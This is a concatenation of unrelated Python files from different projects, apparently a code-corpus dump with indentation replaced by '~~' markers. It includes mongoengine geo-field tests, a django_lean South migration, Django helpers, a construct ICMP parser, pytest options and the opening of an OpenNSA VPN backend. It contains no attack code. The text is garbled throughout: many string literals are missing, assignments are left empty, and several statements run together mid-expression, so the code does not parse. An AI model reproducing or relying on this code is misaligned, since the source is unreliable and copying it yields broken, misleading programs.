expected = \'LineStringField type must be "LineString"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "LineString" , "coordinates" : [ [ 1 , 2 , 3 ] ] } \n 
expected = "Invalid LineString:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "Invalid LineString must contain at least one valid point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ 1 ] ] \n 
expected = "Invalid LineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ 1 , 2 , 3 ] ] \n 
expected = "Invalid LineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Invalid LineString:\\nBoth values (%s) in point must be float or int" % repr ( self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ) . validate ( ) \n 
\n 
~~ def test_polygon_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = PolygonField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'PolygonField type must be "Polygon"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "Polygon" , "coordinates" : [ [ [ 1 , 2 , 3 ] ] ] } \n 
expected = "Invalid Polygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 5 , "a" ] ] ] \n 
expected = "Invalid Polygon:\\nBoth values ([5, \'a\']) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ ] ] ] \n 
expected = "Invalid Polygon must contain at least one valid linestring" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 , 3 ] ] ] \n 
expected = "Invalid Polygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
expected = "Invalid Polygon:\\nBoth values ([{}, {}]) in point must be float or int, Both values ((\'a\', \'b\')) in point must be float or int" self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 ] , [ 3 , 4 ] ] ] \n 
expected = "Invalid Polygon:\\nLineStrings must start and end at the same point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
Location ( loc = [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ) . validate ( ) \n 
\n 
~~ def test_multipoint_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiPointField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiPointField type must be "MultiPoint"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiPoint" , "coordinates" : [ [ 1 , 2 , 3 ] ] } \n 
expected = "Value ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ ] ] \n 
expected = "Invalid MultiPoint must contain at least one valid point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 ] ] , [ [ 1 , 2 , 3 ] ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ 1 , 2 ] ] ) . validate ( ) \n 
Location ( loc = { \n 
"type" : "MultiPoint" , \n 
"coordinates" : [ \n 
[ 1 , 2 ] , \n 
[ 81.4471435546875 , 23.61432859499169 ] \n 
] } ) . validate ( ) \n 
\n 
~~ def test_multilinestring_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiLineStringField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiLineStringField type must be "MultiLineString"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiLineString" , "coordinates" : [ [ [ 1 , 2 , 3 ] ] ] } \n 
expected = "Invalid MultiLineString:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "Invalid MultiLineString must contain at least one valid linestring" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 ] ] ] \n 
expected = "Invalid MultiLineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 , 3 ] ] ] \n 
expected = "Invalid MultiLineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ { } , { } ] ] ] , [ [ ( "a" , "b" ) ] ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Invalid MultiLineString:\\nBoth values (%s) in point must be float or int" % self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ) . validate ( ) \n 
\n 
~~ def test_multipolygon_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiPolygonField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiPolygonField type must be "MultiPolygon"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiPolygon" , "coordinates" : [ [ [ [ 1 , 2 , 3 ] ] ] ] } \n 
expected = "Invalid MultiPolygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 5 , "a" ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nBoth values ([5, \'a\']) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ ] ] ] ] \n 
expected = "Invalid MultiPolygon must contain at least one valid Polygon" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 1 , 2 , 3 ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ { } , { } ] ] ] , [ [ ( "a" , "b" ) ] ] ] \n 
expected = "Invalid MultiPolygon:\\nBoth values ([{}, {}]) in point must be float or int, Both values ((\'a\', \'b\')) in point must be float or int" self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 1 , 2 ] , [ 3 , 4 ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nLineStrings must start and end at the same point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
Location ( loc = [ [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ] ) . validate ( ) \n 
\n 
~~ def test_indexes_geopoint ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
location = GeoPointField ( ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertEqual ( geo_indicies , [ { : [ ( , ) ] } ] ) \n 
\n 
~~ def test_geopoint_embedded_indexes ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields on\n        embedded documents.\n        """ \n 
class Venue ( EmbeddedDocument ) : \n 
~~~ location = GeoPointField ( ) \n 
name = StringField ( ) \n 
\n 
~~ class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
venue = EmbeddedDocumentField ( Venue ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertEqual ( geo_indicies , [ { : [ ( , ) ] } ] ) \n 
\n 
~~ def test_indexes_2dsphere ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
point = PointField ( ) \n 
line = LineStringField ( ) \n 
polygon = PolygonField ( ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
\n 
~~ def test_indexes_2dsphere_embedded ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Venue ( EmbeddedDocument ) : \n 
~~~ name = StringField ( ) \n 
point = PointField ( ) \n 
line = LineStringField ( ) \n 
polygon = PolygonField ( ) \n 
\n 
~~ class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
venue = EmbeddedDocumentField ( Venue ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
\n 
~~ def test_geo_indexes_recursion ( self ) : \n 
\n 
~~~ class Location ( Document ) : \n 
~~~ name = StringField ( ) \n 
location = GeoPointField ( ) \n 
\n 
~~ class Parent ( Document ) : \n 
~~~ name = StringField ( ) \n 
location = ReferenceField ( Location ) \n 
\n 
~~ Location . drop_collection ( ) \n 
Parent . drop_collection ( ) \n 
\n 
Parent ( name = ) . save ( ) \n 
info = Parent . _get_collection ( ) . index_information ( ) \n 
self . assertFalse ( in info ) \n 
info = Location . _get_collection ( ) . index_information ( ) \n 
self . assertTrue ( in info ) \n 
\n 
self . assertEqual ( len ( Parent . _geo_indices ( ) ) , 0 ) \n 
self . assertEqual ( len ( Location . _geo_indices ( ) ) , 1 ) \n 
\n 
~~ def test_geo_indexes_auto_index ( self ) : \n 
\n 
# Test just listing the fields \n 
~~~ class Log ( Document ) : \n 
~~~ location = PointField ( auto_index = False ) \n 
datetime = DateTimeField ( ) \n 
\n 
meta = { \n 
: [ [ ( "location" , "2dsphere" ) , ( "datetime" , 1 ) ] ] \n 
} \n 
\n 
~~ self . assertEqual ( [ ] , Log . _geo_indices ( ) ) \n 
\n 
Log . drop_collection ( ) \n 
Log . ensure_indexes ( ) \n 
\n 
info = Log . _get_collection ( ) . index_information ( ) \n 
self . assertEqual ( info [ "location_2dsphere_datetime_1" ] [ "key" ] , \n 
[ ( , ) , ( , 1 ) ] ) \n 
\n 
# Test listing explicitly \n 
class Log ( Document ) : \n 
~~~ location = PointField ( auto_index = False ) \n 
datetime = DateTimeField ( ) \n 
\n 
meta = { \n 
: [ \n 
{ : [ ( "location" , "2dsphere" ) , ( "datetime" , 1 ) ] } \n 
] \n 
} \n 
\n 
~~ self . assertEqual ( [ ] , Log . _geo_indices ( ) ) \n 
\n 
Log . drop_collection ( ) \n 
Log . ensure_indexes ( ) \n 
\n 
info = Log . _get_collection ( ) . index_information ( ) \n 
self . assertEqual ( info [ "location_2dsphere_datetime_1" ] [ "key" ] , \n 
[ ( , ) , ( , 1 ) ] ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ from south . db import db \n 
\n 
from django . db import models \n 
\n 
from django_lean . experiments . models import * \n 
\n 
class Migration : \n 
~~~ def forwards ( self , orm ) : \n 
\n 
~~~ db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
\n 
db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
\n 
db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
# Creating unique_together for [user, experiment] on Participant. \n 
db . create_unique ( , [ , ] ) \n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
~~~ db . delete_table ( ) \n 
\n 
\n 
db . delete_table ( ) \n 
\n 
\n 
db . delete_table ( ) \n 
\n 
# Deleting unique_together for [user, experiment] on Participant. \n 
db . delete_unique ( , [ , ] ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : "orm[\'auth.Permission\']" } , \n 
: { \n 
: { : "((\'content_type\', \'codename\'),)" } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'contenttypes.ContentType\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : "orm[\'auth.Group\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Permission\']" : ( , [ ] , { : , : } , \n 
: { \n 
: { : "((\'app_label\', \'model\'),)" , : "\'django_content_type\'" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { : "orm[\'experiments.Experiment\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { } ) \n 
} , \n 
: { \n 
: ( , [ ] , { : , : } ) : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : "((\'user\', \'experiment\'),)" } , \n 
: ( , [ ] , { : , : ( , [ ] , { : "orm[\'experiments.Experiment\']" : ( , [ ] , { } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.User\']" } ) \n 
} \n 
} \n 
\n 
complete_apps = [ ] \n 
~~ class SimpleEngagementCalculator ( object ) : \n 
\n 
~~~ def calculate_user_engagement_score ( self , user , start_date , end_date ) : \n 
~~~ return 0 \n 
\n 
~~ ~~ ROOT_URLCONF = None \n 
DATABASE_ENGINE = \n 
DATABASE_NAME = \n 
DATABASE_SUPPORTS_TRANSACTIONS = False \n 
INSTALLED_APPS = [ \n 
, \n 
, \n 
, \n 
, \n 
] \n 
TEMPLATE_CONTEXT_PROCESSORS = ( \n 
"django.core.context_processors.auth" , \n 
"django.core.context_processors.debug" , \n 
"django.core.context_processors.i18n" , \n 
"django.core.context_processors.media" , \n 
"django.core.context_processors.request" ) \n 
\n 
from contextlib import contextmanager \n 
\n 
from django . contrib . sites . models import Site \n 
from django . core import mail \n 
from django . db import transaction \n 
from django . utils . functional import LazyObject \n 
\n 
\n 
def get_current_site ( ) : \n 
~~~ if Site . _meta . installed : \n 
~~~ return Site . objects . get_current ( ) \n 
~~ return None \n 
\n 
~~ def in_transaction ( test_ignore = True ) : \n 
~~~ result = transaction . is_managed ( ) \n 
if test_ignore : \n 
# Ignore when running inside a Django test case, which uses \n 
# transactions. \n 
~~~ result = result and not hasattr ( mail , ) \n 
~~ return result \n 
\n 
\n 
~~ @ contextmanager \n 
def patch ( namespace , name , function ) : \n 
~~~ """Patches `namespace`.`name` with `function`.""" \n 
if isinstance ( namespace , LazyObject ) : \n 
~~~ if namespace . _wrapped is None : \n 
~~~ namespace . _setup ( ) \n 
~~ namespace = namespace . _wrapped \n 
~~ try : \n 
~~~ original = getattr ( namespace , name ) \n 
~~ except AttributeError : \n 
~~~ original = NotImplemented \n 
~~ try : \n 
~~~ setattr ( namespace , name , function ) \n 
yield \n 
~~ finally : \n 
~~~ if original is NotImplemented : \n 
~~~ delattr ( namespace , name ) \n 
~~ else : \n 
~~~ setattr ( namespace , name , original ) \n 
~~ ~~ ~~ """\nfile systems on-disk formats (ext2, fat32, ntfs, ...) \nand related disk formats (mbr, ...)\n""" \n 
"""\nInternet Control Message Protocol for IPv4 (TCP/IP protocol stack)\n""" \n 
from construct import * \n 
from ipv4 import IpAddress \n 
\n 
\n 
echo_payload = Struct ( "echo_payload" , \n 
UBInt16 ( "identifier" ) , \n 
UBInt16 ( "sequence" ) , \n 
Bytes ( "data" , 32 ) , # length is implementation dependent...  \n 
# is anyone using more than 32 bytes? \n 
) \n 
\n 
dest_unreachable_payload = Struct ( "dest_unreachable_payload" , \n 
Padding ( 2 ) , \n 
UBInt16 ( "next_hop_mtu" ) , \n 
IpAddress ( "host" ) , \n 
Bytes ( "echo" , 8 ) , \n 
) \n 
\n 
dest_unreachable_code = Enum ( Byte ( "code" ) , \n 
Network_unreachable_error = 0 , \n 
Host_unreachable_error = 1 , \n 
Protocol_unreachable_error = 2 , \n 
Port_unreachable_error = 3 , \n 
The_datagram_is_too_big = 4 , \n 
Source_route_failed_error = 5 , \n 
Destination_network_unknown_error = 6 , \n 
Destination_host_unknown_error = 7 , \n 
Source_host_isolated_error = 8 , \n 
Desination_administratively_prohibited = 9 , \n 
Host_administratively_prohibited2 = 10 , \n 
Network_TOS_unreachable = 11 , \n 
Host_TOS_unreachable = 12 , \n 
) \n 
\n 
icmp_header = Struct ( "icmp_header" , \n 
Enum ( Byte ( "type" ) , \n 
Echo_reply = 0 , \n 
Destination_unreachable = 3 , \n 
Source_quench = 4 , \n 
Redirect = 5 , \n 
Alternate_host_address = 6 , \n 
Echo_request = 8 , \n 
Router_advertisement = 9 , \n 
Router_solicitation = 10 , \n 
Time_exceeded = 11 , \n 
Parameter_problem = 12 , \n 
Timestamp_request = 13 , \n 
Timestamp_reply = 14 , \n 
Information_request = 15 , \n 
Information_reply = 16 , \n 
Address_mask_request = 17 , \n 
Address_mask_reply = 18 , \n 
_default_ = Pass , \n 
) , \n 
Switch ( "code" , lambda ctx : ctx . type , \n 
{ \n 
"Destination_unreachable" : dest_unreachable_code , \n 
} , \n 
default = Byte ( "code" ) , \n 
) , \n 
UBInt16 ( "crc" ) , \n 
Switch ( "payload" , lambda ctx : ctx . type , \n 
{ \n 
"Echo_reply" : echo_payload , \n 
"Echo_request" : echo_payload , \n 
"Destination_unreachable" : dest_unreachable_payload , \n 
} , \n 
default = Pass \n 
) \n 
) \n 
\n 
\n 
if __name__ == "__main__" : \n 
~~~ cap1 = ( "0800305c02001b006162636465666768696a6b6c6d6e6f70717273747576776162" \n 
"63646566676869" ) . decode ( "hex" ) \n 
cap2 = ( "0000385c02001b006162636465666768696a6b6c6d6e6f70717273747576776162" \n 
"63646566676869" ) . decode ( "hex" ) \n 
cap3 = ( "0301000000001122aabbccdd0102030405060708" ) . decode ( "hex" ) \n 
\n 
print icmp_header . parse ( cap1 ) \n 
print icmp_header . parse ( cap2 ) \n 
print icmp_header . parse ( cap3 ) \n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
~~ from construct . core import Container \n 
from construct . adapters import Adapter \n 
\n 
class AstNode ( Container ) : \n 
~~~ def __init__ ( self , nodetype , ** kw ) : \n 
~~~ Container . __init__ ( self ) \n 
self . nodetype = nodetype \n 
for k , v in sorted ( kw . iteritems ( ) ) : \n 
~~~ setattr ( self , k , v ) \n 
\n 
~~ ~~ def accept ( self , visitor ) : \n 
~~~ return getattr ( visitor , "visit_%s" % ( self . nodetype , ) ) ( self ) \n 
\n 
~~ ~~ class AstTransformator ( Adapter ) : \n 
~~~ def _decode ( self , obj , context ) : \n 
~~~ return self . to_ast ( obj , context ) \n 
~~ def _encode ( self , obj , context ) : \n 
~~~ return self . to_cst ( obj , context ) \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ def pytest_funcarg__setupopts ( request ) : \n 
~~~ return OptsSetup ( request ) \n 
\n 
~~ def pytest_addoption ( parser ) : \n 
~~~ parser . addoption ( "--uri-file" , dest = "urifile" , \n 
type = str , default = None , \n 
help = "Location for uri file if NameServer is not used. If not specified, default is current working directory." parser . addoption ( "--use-ns" , dest = "use_ns" , \n 
action = "store_true" , \n 
help = "Use the Pyro NameServer to store object locations" ) \n 
parser . addoption ( "--create-graph" , dest = "create_graph" , \n 
action = "store_true" , \n 
help = "Create a .dot file with graphical representation of pipeline relationships" parser . addoption ( "--num-executors" , dest = "num_exec" , \n 
type = int , default = 0 , \n 
help = "Launch executors automatically without having to run pipeline_excutor.py independently." parser . addoption ( "--time" , dest = "time" , \n 
type = str , default = "2:00:00:00" , \n 
help = "Wall time to request for each executor in the format dd:hh:mm:ss" ) \n 
parser . addoption ( "--proc" , dest = "proc" , \n 
type = int , default = 8 , \n 
help = "Number of processes per executor. Default is 8. Also sets max value for processor use per executor. Overridden if --num-executors not specified." parser . addoption ( "--mem" , dest = "mem" , \n 
type = float , default = 16 , \n 
help = "Total amount of requested memory. Default is 8G. Overridden if --num-executors not specified." parser . addoption ( "--ppn" , dest = "ppn" , \n 
type = int , default = 8 , \n 
help = "Number of processes per node. Default is 8. Used when --queue=pbs" ) \n 
parser . addoption ( "--queue" , dest = "queue" , \n 
type = str , default = None , \n 
help = "Use specified queueing system to submit jobs. Default is None." ) \n 
parser . addoption ( "--restart" , dest = "restart" , \n 
action = "store_true" , \n 
help = "Restart pipeline using backup files." ) \n 
parser . addoption ( "--backup-dir" , dest = "backup_directory" , \n 
type = str , default = ".pipeline-backup" , \n 
help = "Directory where this pipeline backup should be stored." ) \n 
\n 
~~ class OptsSetup ( ) : \n 
~~~ def __init__ ( self , request ) : \n 
~~~ self . config = request . config \n 
\n 
~~ def returnAllOptions ( self ) : \n 
~~~ return self . config . option \n 
\n 
~~ def getNumExecutors ( self ) : \n 
~~~ return self . config . option . num_exec \n 
\n 
~~ def getTime ( self ) : \n 
~~~ return self . config . option . time \n 
\n 
~~ def getProc ( self ) : \n 
~~~ return self . config . option . proc \n 
\n 
~~ def getMem ( self ) : \n 
~~~ return self . config . option . mem \n 
\n 
~~ def getQueue ( self ) : \n 
~~~ return self . config . option . queue \n 
\n 
~~ def getPpn ( self ) : \n 
~~~ return self . config . option . ppn \n 
\n 
~~ def getRestart ( self ) : \n 
~~~ return self . config . option . restart \n 
\n 
~~ def getBackupDir ( self ) : \n 
~~~ return self . config . option . backup_directory \n 
\n 
~~ def returnSampleArgs ( self ) : \n 
~~~ sampleArgArray = [ "TestProgName.py" , "img_A.mnc" , "img_B.mnc" ] \n 
return sampleArgArray \n 
~~ ~~ """\nBackend for NCS VPN module.\n\nAuthor: Henrik Thostrup Jensen <htj at nordu.net>\nCopyright: NORDUnet(2011-2013)\n""" \n 
\n 
import base64 \n 
import random \n 
\n 
from twisted . python import log \n 
from twisted . web . error import Error as WebError \n 
\n 
from opennsa import constants as cnt , config \n 
from opennsa . backends . common import genericbackend \n 
from opennsa . protocols . shared import httpclient \n 
\n 
\n 
# basic payload \n 
# \n 
#<service xmlns="http://tail-f.com/ns/ncs" > \n 
#  <object-id>nsi-vpn</object-id> \n 
#  <type> \n 
#    <vpn xmlns="http://nordu.net/ns/ncs/vpn"> \n 
#      <side-a> \n 
#        <router>routerA</router> \n 
#        <interface>interface1</interface> \n 
#      </side-a> \n 
#      <side-b> \n 
#        <router></router> \n 
#        <interface>ge-1/0/1</interface> \n 
#      </side-b> \n 
#      <vlan>1720</vlan> \n 
#    </vpn> \n 
#  </type> \n 
#</service> \n 
# \n 
# encapsulation type can be ethernet or ethernet-vlan \n 
# vlan must be specified if encapsulation-type is ethernet-vlan, otherwise not \n 
# \n 
# the payload must be posted to the services url, e.g.,: \n 
# http://localhost:8080/api/running/services \n 
# \n 
# To tear down the VPN, do a DELETE against \n 
# "http://localhost:8080/api/running/services/service/nsi-vpn" \n 
# \n 
# The connection id -> object-id mapping is hence rather important to remember, but it can be the \n 
\n 
NCS_TIMEOUT = 60 # ncs typically spends 25-32 seconds creating/deleting a vpn, sometimes a bit more \n 
\n 
NO_OUT_OF_SYNC_CHECK = # put this as a query parameter to get ncs to bypass the check \n 
\n 
\n 
ETHERNET_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan>%(vlan)i</vlan>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
ETHERNET_VLAN_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan>%(vlan)i</vlan>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
ETHERNET_VLAN_REWRITE_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan-side-a>%(vlan_a)i</vlan-side-a>\n    <vlan-side-b>%(vlan_b)i</vlan-side-b>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
\n 
LOG_SYSTEM = \n 
\n 
\n 
\n 
class NCSVPNTarget ( object ) : \n 
\n 
~~~ def __init__ ( self , router , interface , vlan = None ) : \n 
~~~ self . router = router \n 
self . interface = interface \n 
self . vlan = vlan \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if self . vlan : \n 
~~~ return % ( self . router , self . interface , self . vlan ) \n 
~~ else : \n 
~~~ return % ( self . router , self . interface ) \n 
\n 
\n 
\n 
~~ ~~ ~~ def createVPNPayload ( service_name , source_target , dest_target ) : \n 
\n 
~~~ intps = { \n 
: service_name , \n 
: service_name , \n 
: source_target . router , \n 
: source_target . interface , \n 
: dest_target . router , \n 
: dest_target . interface \n 
} \n 
\n 
if source_target . vlan and dest_target . vlan : \n 
~~~ if source_target . vlan == dest_target . vlan : \n 
~~~ intps [ ] = source_target . vlan \n 
payload = ETHERNET_VLAN_VPN_PAYLOAD_BASE % intps \n 
~~ else : \n 
~~~ intps [ ] = source_target . vlan \n 
intps [ ] = dest_target . vlan \n 
payload = ETHERNET_VLAN_REWRITE_VPN_PAYLOAD_BASE % intps \n 
~~ ~~ else : \n 
~~~ payload = ETHERNET_VPN_PAYLOAD_BASE % intps \n 
\n 
~~ return payload \n 
\n 
\n 
\n 
~~ def _extractErrorMessage ( failure ) : \n 
# used to extract error messages from http requests \n 
~~~ if isinstance ( failure . value , WebError ) : \n 
~~~ return failure . value . response \n 
~~ else : \n 
~~~ return failure . getErrorMessage ( ) \n 
\n 
\n 
\n 
~~ ~~ class NCSVPNConnectionManager : \n 
\n 
~~~ def __init__ ( self , ncs_services_url , user , password , port_map , log_system ) : \n 
~~~ self . ncs_services_url = ncs_services_url \n 
self . user = user \n 
self . password = password \n 
self . port_map = port_map \n 
self . log_system = log_system \n 
\n 
\n 
~~ def getResource ( self , port , label_type , label_value ) : \n 
~~~ assert label_type in ( None , cnt . ETHERNET_VLAN ) , \n 
